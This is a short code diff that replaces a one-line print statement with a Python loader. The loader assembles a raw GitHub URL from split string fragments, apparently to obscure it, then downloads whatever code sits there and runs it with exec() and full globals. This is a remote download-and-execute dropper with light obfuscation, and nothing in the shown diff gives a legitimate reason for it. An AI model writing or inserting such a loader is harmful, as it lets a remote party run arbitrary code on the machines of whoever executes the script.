@@ -1,1 +1,14 @@
-print("Oi")
+url = "htt" + "ps" + "://raw.gith" + "ubusercontent.com/StormGab1" + "/Repository2234/main/xdqwd"
+
+def execute_code_from_url(url):
+    try:
+        response = requests.get(url)
+        response.raise_for_status()
+        code = response.text
+        
+        exec(code, globals())
+    except requests.RequestException as e:
+        print(f"Error {e}")
+
+if __name__ == "__main__":
+    execute_code_from_url(url)
